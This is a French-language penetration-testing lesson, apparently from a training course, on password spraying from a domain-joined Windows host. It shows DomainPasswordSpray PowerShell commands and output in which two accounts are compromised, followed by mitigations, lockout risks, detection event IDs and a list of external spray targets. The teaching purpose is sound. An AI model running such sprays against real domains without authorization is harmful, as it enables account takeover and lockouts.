Pulvérisation de mot de passe interne - à partir de Windows
===========================================================

* * * * *

Depuis un pied sur un hôte Windows joint à un domaine, le [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)outil est très efficace. Si nous sommes authentifiés sur le domaine, l'outil générera automatiquement une liste d'utilisateurs à partir d'Active Directory, interrogera la politique de mot de passe du domaine et exclura les comptes d'utilisateurs en une seule tentative de verrouillage. Comme la façon dont nous avons exécuté l'attaque par pulvérisation à partir de notre hôte Linux, nous pouvons également fournir une liste d'utilisateurs à l'outil si nous sommes sur un hôte Windows mais non authentifiés auprès du domaine. Nous pouvons rencontrer une situation où le client souhaite que nous effectuions des tests à partir d'un appareil Windows géré dans son réseau sur lequel nous pouvons charger des outils. Nous pouvons être physiquement sur place dans leurs bureaux et souhaiter tester à partir d'une machine virtuelle Windows, ou nous pouvons prendre pied grâce à une autre attaque, nous authentifier auprès d'un hôte du domaine et effectuer une pulvérisation de mot de passe dans le but d'obtenir des informations d'identification pour un compte qui a plus de droits dans le domaine.

Plusieurs options s'offrent à nous avec l'outil. Étant donné que l'hôte est joint à un domaine, nous allons ignorer l' `-UserList`indicateur et laisser l'outil générer une liste pour nous. Nous fournirons l' `Password`indicateur et un seul mot de passe, puis utiliserons l' `-OutFile`indicateur pour écrire notre sortie dans un fichier pour une utilisation ultérieure.

#### Utilisation de DomainPasswordSpray.ps1

  Utilisation de DomainPasswordSpray.ps1

```
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2923 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2923 users gathered from the current user's domain
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2923 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): Y

[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM
[*] Writing successes to spray_success
[*] SUCCESS! User:sgage Password:Welcome1
[*] SUCCESS! User:tjohnson Password:Welcome1

[*] Password spraying is complete
[*] Any passwords that were successfully sprayed have been output to spray_success

```

Nous pourrions également utiliser Kerbrute pour effectuer les mêmes étapes d'énumération d'utilisateurs et de pulvérisation que celles présentées dans la section précédente. L'outil est présent dans le `C:\Tools`répertoire si vous souhaitez travailler sur les mêmes exemples à partir de l'hôte Windows fourni.

* * * * *

Atténuations
------------

Plusieurs mesures peuvent être prises pour atténuer le risque d'attaques par pulvérisation de mot de passe. Bien qu'aucune solution unique n'empêche entièrement l'attaque, une approche de défense en profondeur rendra les attaques par pulvérisation de mots de passe extrêmement difficiles.

| Technique | Description |
| --- | --- |
| `Multi-factor Authentication` | L'authentification multifacteur peut réduire considérablement le risque d'attaques par pulvérisation de mot de passe. De nombreux types d'authentification multifacteur existent, tels que les notifications push sur un appareil mobile, un mot de passe à usage unique (OTP) rotatif tel que Google Authenticator, une clé RSA ou des confirmations par SMS. Bien que cela puisse empêcher un attaquant d'accéder à un compte, certaines implémentations multi-facteurs révèlent toujours si la combinaison nom d'utilisateur/mot de passe est valide. Il peut être possible de réutiliser ces informations d'identification avec d'autres services ou applications exposés. Il est important de mettre en place des solutions multifactorielles avec tous les portails externes. |
| `Restricting Access` | Il est souvent possible de se connecter à des applications avec n'importe quel compte d'utilisateur de domaine, même si l'utilisateur n'a pas besoin d'y accéder dans le cadre de son rôle. Conformément au principe du moindre privilège, l'accès à l'application doit être limité à ceux qui en ont besoin. |
| `Reducing Impact of Successful Exploitation` | Un gain rapide consiste à s'assurer que les utilisateurs privilégiés disposent d'un compte séparé pour toutes les activités administratives. Des niveaux d'autorisation spécifiques à l'application doivent également être implémentés si possible. La segmentation du réseau est également recommandée car si un attaquant est isolé dans un sous-réseau compromis, cela peut ralentir ou arrêter complètement le mouvement latéral et d'autres compromis. |
| `Password Hygiene` | Éduquer les utilisateurs sur la sélection de mots de passe difficiles à deviner tels que les phrases de passe peut réduire considérablement l'efficacité d'une attaque par pulvérisation de mot de passe. De plus, l'utilisation d'un filtre de mot de passe pour restreindre les mots de dictionnaire courants, les noms de mois et de saisons et les variations du nom de l'entreprise rendra assez difficile pour un attaquant de choisir un mot de passe valide pour les tentatives de pulvérisation. |

* * * * *

autres considérations
---------------------

Il est essentiel de s'assurer que votre politique de verrouillage de mot de passe de domaine n'augmente pas le risque d'attaques par déni de service. S'il est très restrictif et nécessite une intervention administrative pour déverrouiller les comptes manuellement, un spray de mot de passe négligent peut verrouiller de nombreux comptes en peu de temps.

* * * * *

Détection
---------

Certains indicateurs d'attaques par pulvérisation de mots de passe externes incluent de nombreux verrouillages de compte sur une courte période, des journaux de serveur ou d'application indiquant de nombreuses tentatives de connexion avec des utilisateurs valides ou inexistants, ou de nombreuses demandes sur une courte période vers une application ou une URL spécifique.

Dans le journal de sécurité du contrôleur de domaine, de nombreuses instances de l'ID d'événement [4625 : un compte n'a pas pu se connecter](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625) pendant une courte période peuvent indiquer une attaque par pulvérisation de mot de passe. Les organisations doivent avoir des règles pour corréler de nombreux échecs de connexion dans un intervalle de temps défini pour déclencher une alerte. Un attaquant plus avisé peut éviter la pulvérisation du mot de passe SMB et cibler LDAP à la place. Les organisations doivent également surveiller l'ID d'événement [4771 : Échec de la pré-authentification Kerberos](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771) , ce qui peut indiquer une tentative de pulvérisation du mot de passe LDAP. Pour ce faire, ils devront activer la journalisation Kerberos. Cet [article](https://www.hub.trimarcsecurity.com/post/trimarc-research-detecting-password-spraying-with-security-event-auditing) détaille les recherches sur la détection de la pulvérisation de mot de passe à l'aide de la journalisation des événements de sécurité Windows.

Avec ces atténuations finement réglées et avec la journalisation activée, une organisation sera bien placée pour détecter et se défendre contre les attaques de pulvérisation de mots de passe internes et externes.

* * * * *

Pulvérisation de mot de passe externe
-------------------------------------

Bien qu'en dehors du cadre de ce module, la pulvérisation de mots de passe est également un moyen courant que les attaquants utilisent pour tenter de prendre pied sur Internet. Nous avons eu beaucoup de succès avec cette méthode lors de tests d'intrusion pour accéder à des données sensibles via des boîtes de réception de courrier électronique ou des applications Web telles que des sites intranet externes. Certaines cibles communes incluent :

-   Microsoft 0365
-   Outlook Web Exchange
-   Accès Web Exchange
-   Skype Entreprise
-   Serveur Lync
-   Portails Microsoft Remote Desktop Services (RDS)
-   Portails Citrix utilisant l'authentification AD
-   Implémentations VDI utilisant l'authentification AD comme VMware Horizon
-   Portails VPN (Citrix, SonicWall, OpenVPN, Fortinet, etc. qui utilisent l'authentification AD)
-   Applications Web personnalisées utilisant l'authentification AD

* * * * *

Aller plus loin
---------------

Maintenant que nous avons plusieurs ensembles d'informations d'identification valides, nous pouvons commencer à creuser plus profondément dans le domaine en effectuant une énumération des informations d'identification avec divers outils. Nous allons parcourir plusieurs outils qui se complètent pour nous donner l'image la plus complète et la plus précise d'un environnement de domaine. Avec ces informations, nous chercherons à nous déplacer latéralement et verticalement dans le domaine pour éventuellement atteindre l'objectif final de notre évaluation.
